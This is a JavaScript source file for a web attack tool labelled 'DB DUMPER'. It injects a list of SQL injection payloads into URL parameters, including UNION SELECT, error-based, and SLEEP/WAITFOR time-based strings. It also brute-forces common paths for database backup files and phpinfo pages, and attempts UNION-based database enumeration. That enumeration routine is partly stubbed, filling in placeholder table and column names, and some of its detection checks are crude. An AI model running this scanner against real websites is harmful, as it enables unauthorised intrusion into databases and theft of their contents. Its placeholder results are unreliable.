// ===== DB DUMPER - SCANNER MODULE =====
class DbScanner {
    constructor() {
        this.commonSqlErrors = {
            mysql: [
                "You have an error in your SQL syntax",
                "MySQL server version",
                "mysqli_fetch",
                "mysql_fetch",
                "supplied argument is not a valid MySQL",
                "unclosed quotation mark",
                "MySqlClient"
            ],
            mssql: [
                "Microsoft OLE DB Provider for SQL Server",
                "Microsoft SQL Server",
                "SQL Server JDBC Driver",
                "[SQL Server]",
                "Unclosed quotation mark",
                "'80040e14'"
            ],
            postgresql: [
                "PostgreSQL query failed",
                "pg_exec",
                "PG::SyntaxError",
                "org.postgresql.util.PSQLException",
                "ERROR: syntax error"
            ],
            oracle: [
                "ORA-",
                "Oracle error",
                "Oracle Database",
                "Oracle JDBC",
                "PLS-"
            ]
        };
    }
    
    // Deep SQL injection scan
    async deepSQLiScan(url, parameters = {}) {
        const findings = [];
        
        // Common SQLi payloads
        const payloads = [
            // Basic injection
            "'",
            "\"",
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            
            // Union based
            "' UNION SELECT null--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT database(),user(),version()--",
            
            // Error based
            "' AND 1=CAST((SELECT version()) AS INT)--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
            
            // Blind injection
            "' AND SLEEP(5)--",
            "' OR IF(1=1,SLEEP(5),0)--",
            
            // Time based
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR pg_sleep(5)--"
        ];
        
        // Test each parameter
        for (const [param, value] of Object.entries(parameters)) {
            for (const payload of payloads) {
                try {
                    const testParams = { ...parameters };
                    testParams[param] = value + payload;
                    
                    const testUrl = this.buildUrl(url, testParams);
                    const startTime = Date.now();
                    
                    const response = await this.makeRequest(testUrl);
                    const responseTime = Date.now() - startTime;
                    
                    // Check for errors
                    const isError = this.checkForSqlErrors(response);
                    
                    // Check for time delays (blind SQLi)
                    const isDelayed = responseTime > 3000; // 3 seconds
                    
                    // Check for different response
                    const baseResponse = await this.makeRequest(this.buildUrl(url, parameters));
                    const isDifferent = response !== baseResponse;
                    
                    if (isError || isDelayed || isDifferent) {
                        findings.push({
                            parameter: param,
                            payload: payload,
                            type: isError ? 'error_based' : isDelayed ? 'time_based' : 'boolean_based',
                            response_time: responseTime,
                            evidence: isError ? 'SQL error detected' : 
                                     isDelayed ? 'Time delay detected' : 
                                     'Different response'
                        });
                    }
                    
                    // Small delay
                    await new Promise(resolve => setTimeout(resolve, 500));
                    
                } catch (error) {
                    // Continue with next payload
                }
            }
        }
        
        return findings;
    }
    
    // Build URL with parameters
    buildUrl(baseUrl, params) {
        const url = new URL(baseUrl);
        Object.entries(params).forEach(([key, value]) => {
            url.searchParams.set(key, value);
        });
        return url.toString();
    }
    
    // Make HTTP request
    async makeRequest(url) {
        try {
            const response = await fetch(url, {
                method: 'GET',
                headers: {
                    'User-Agent': 'HOOPSTEAM-Scanner/1.0'
                },
                timeout: 10000
            });
            
            if (response.ok) {
                return await response.text();
            }
            return `HTTP ${response.status}`;
        } catch (error) {
            return error.message;
        }
    }
    
    // Check for SQL errors in response
    checkForSqlErrors(responseText) {
        if (typeof responseText !== 'string') return false;
        
        const text = responseText.toLowerCase();
        
        // Check for generic SQL errors
        const genericErrors = [
            'sql syntax',
            'sql error',
            'database error',
            'syntax error',
            'unclosed quotation'
        ];
        
        if (genericErrors.some(error => text.includes(error))) {
            return true;
        }
        
        // Check for specific DBMS errors
        for (const [db, errors] of Object.entries(this.commonSqlErrors)) {
            for (const error of errors) {
                if (text.includes(error.toLowerCase())) {
                    return db;
                }
            }
        }
        
        return false;
    }
    
    // Scan for database files
    async scanForDbFiles(url) {
        const dbExtensions = [
            '.sql',
            '.db',
            '.sqlite',
            '.sqlite3',
            '.mdb',
            '.accdb',
            '.bak',
            '.backup',
            '.dump',
            '.tar',
            '.gz',
            '.zip'
        ];
        
        const commonPaths = [
            '/backup/',
            '/database/',
            '/db/',
            '/sql/',
            '/dump/',
            '/data/',
            '/admin/backup/',
            '/admin/db/'
        ];
        
        const findings = [];
        
        for (const path of commonPaths) {
            for (const ext of dbExtensions) {
                const testUrl = url + path + 'database' + ext;
                
                try {
                    const response = await fetch(testUrl, { method: 'HEAD' });
                    
                    if (response.ok) {
                        findings.push({
                            url: testUrl,
                            type: 'database_file',
                            extension: ext,
                            size: response.headers.get('content-length') || 'unknown'
                        });
                    }
                } catch (error) {
                    // File doesn't exist or inaccessible
                }
            }
        }
        
        return findings;
    }
    
    // Check for information disclosure
    async checkInfoDisclosure(url) {
        const findings = [];
        
        const testPaths = [
            '/phpinfo.php',
            '/info.php',
            '/test.php',
            '/debug.php',
            '/status.php',
            '/server-status',
            '/server-info'
        ];
        
        for (const path of testPaths) {
            const testUrl = url + path;
            
            try {
                const response = await fetch(testUrl);
                
                if (response.ok) {
                    const text = await response.text();
                    
                    if (text.includes('PHP Version') || 
                        text.includes('System') || 
                        text.includes('Configuration') ||
                        text.includes('Apache Status')) {
                        
                        findings.push({
                            url: testUrl,
                            type: 'information_disclosure',
                            details: 'Server information exposed'
                        });
                    }
                }
            } catch (error) {
                // Continue checking
            }
        }
        
        return findings;
    }
    
    // Enumerate database
    async enumerateDatabase(url, injectionPoint) {
        // This is a simplified enumeration
        // Real implementation would use SQL injection to extract data
        
        const enumeration = {
            databases: [],
            tables: [],
            columns: [],
            users: [],
            version: null
        };
        
        try {
            // Try to get database version
            const versionPayload = injectionPoint + "' UNION SELECT version(),null--";
            const versionResponse = await this.makeRequest(url + versionPayload);
            
            if (versionResponse) {
                const versionMatch = versionResponse.match(/(\d+\.\d+\.\d+)/);
                if (versionMatch) {
                    enumeration.version = versionMatch[1];
                }
            }
            
            // Try to get current database
            const dbPayload = injectionPoint + "' UNION SELECT database(),null--";
            const dbResponse = await this.makeRequest(url + dbPayload);
            
            if (dbResponse) {
                enumeration.databases.push('current_database');
            }
            
            // These would be expanded with actual SQL injection queries
            enumeration.tables.push('users (potential)');
            enumeration.tables.push('posts (potential)');
            enumeration.tables.push('settings (potential)');
            
            enumeration.columns.push('id, username, password (common)');
            enumeration.columns.push('email, created_at (common)');
            
        } catch (error) {
            console.error('Enumeration failed:', error);
        }
        
        return enumeration;
    }
}

// Export
if (typeof module !== 'undefined' && module.exports) {
    module.exports = DbScanner;
}